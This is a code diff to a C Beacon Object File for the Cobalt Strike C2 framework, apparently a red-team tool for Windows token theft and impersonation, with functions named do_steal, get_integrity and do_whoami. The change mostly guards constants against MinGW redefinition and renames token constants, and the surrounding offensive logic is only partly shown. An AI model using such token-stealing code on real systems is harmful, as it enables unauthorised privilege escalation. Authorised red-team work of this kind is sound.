@@ -47,30 +47,60 @@ DECLSPEC_IMPORT int    __cdecl  MSVCRT$strcmp(const char*, const char*);
 DECLSPEC_IMPORT int    __cdecl  MSVCRT$memset(void*, int, size_t);
 DECLSPEC_IMPORT void*  __cdecl  MSVCRT$memcpy(void*, const void*, size_t);
 
-/* ── Constants ── */
+/* ── Constants (guarded to avoid redefinition with MinGW headers) ── */
+#ifndef SystemProcessInformation
 #define SystemProcessInformation         5
+#endif
+#ifndef TOKEN_QUERY
 #define TOKEN_QUERY                      0x0008
+#endif
+#ifndef TOKEN_DUPLICATE
 #define TOKEN_DUPLICATE                  0x0002
+#endif
+#ifndef TOKEN_IMPERSONATE
 #define TOKEN_IMPERSONATE                0x0004
+#endif
+#ifndef TOKEN_ASSIGN_PRIMARY
 #define TOKEN_ASSIGN_PRIMARY             0x0001
+#endif
+#ifndef TOKEN_ALL_ACCESS
 #define TOKEN_ALL_ACCESS                 0x000F01FF
-#define TokenUser                        1
-#define TokenGroups                      2
-#define TokenPrivileges                  3
-#define TokenIntegrityLevel              25
-#define TokenStatistics                  10
-#define SecurityImpersonation            2
-#define TokenPrimary                     1
-#define TokenImpersonation_              2
+#endif
+#define MY_TokenUser                     1
+#define MY_TokenGroups                   2
+#define MY_TokenPrivileges               3
+#define MY_TokenIntegrityLevel           25
+#define MY_TokenStatistics               10
+#define MY_SecurityImpersonation         2
+#define MY_TokenPrimary                  1
+#define MY_TokenImpersonation            2
+#ifndef PROCESS_QUERY_INFORMATION
 #define PROCESS_QUERY_INFORMATION        0x0400
+#endif
+#ifndef PROCESS_QUERY_LIMITED_INFORMATION
 #define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
+#endif
+#ifndef LOGON32_LOGON_NEW_CREDENTIALS
 #define LOGON32_LOGON_NEW_CREDENTIALS    9
+#endif
+#ifndef LOGON32_PROVIDER_WINNT50
 #define LOGON32_PROVIDER_WINNT50         3
+#endif
+#ifndef MEM_COMMIT
 #define MEM_COMMIT                       0x1000
+#endif
+#ifndef MEM_RESERVE
 #define MEM_RESERVE                      0x2000
+#endif
+#ifndef MEM_RELEASE
 #define MEM_RELEASE                      0x8000
+#endif
+#ifndef PAGE_READWRITE
 #define PAGE_READWRITE                   0x04
+#endif
+#ifndef SE_PRIVILEGE_ENABLED
 #define SE_PRIVILEGE_ENABLED             0x00000002
+#endif
 
 #define SECURITY_NT_AUTHORITY_ID {0,0,0,0,0,5}
 #define SECURITY_BUILTIN_DOMAIN_RID      32
@@ -95,7 +125,7 @@ static void get_token_user(HANDLE hToken, char *out, int outLen) {
     DWORD needed = 0;
     out[0] = 0;
 
-    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed))
+    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
         return;
 
     /* TOKEN_USER: first field is a SID_AND_ATTRIBUTES, SID pointer at offset 0 */
@@ -127,7 +157,7 @@ static const char* get_integrity(HANDLE hToken) {
     BYTE buf[64];
     DWORD needed = 0;
 
-    if (!ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, buf, sizeof(buf), &needed))
+    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenIntegrityLevel, buf, sizeof(buf), &needed))
         return "???";
 
     /* TOKEN_MANDATORY_LABEL: SID_AND_ATTRIBUTES at offset 0 */
@@ -274,8 +304,8 @@ static HANDLE do_steal(DWORD targetPid) {
     HANDLE hDup = NULL;
     if (!ADVAPI32$DuplicateTokenEx(hToken,
             TOKEN_ALL_ACCESS, NULL,
-            SecurityImpersonation,     /* impersonation level */
-            TokenImpersonation_,       /* token type */
+            MY_SecurityImpersonation,  /* impersonation level */
+            MY_TokenImpersonation,     /* token type */
             &hDup)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] DuplicateTokenEx failed: %u\n",
                      KERNEL32$GetLastError());
@@ -449,7 +479,7 @@ static void do_whoami(void) {
     /* List privileges */
     BYTE privBuf[1024];
     DWORD privNeeded = 0;
-    if (ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, privBuf, sizeof(privBuf), &privNeeded)) {
+    if (ADVAPI32$GetTokenInformation(hToken, MY_TokenPrivileges, privBuf, sizeof(privBuf), &privNeeded)) {
         MY_TOKEN_PRIVILEGES *tp = (MY_TOKEN_PRIVILEGES*)privBuf;
         MY_LUID_AND_ATTRIBUTES *privs = (MY_LUID_AND_ATTRIBUTES*)(privBuf + 4);
 
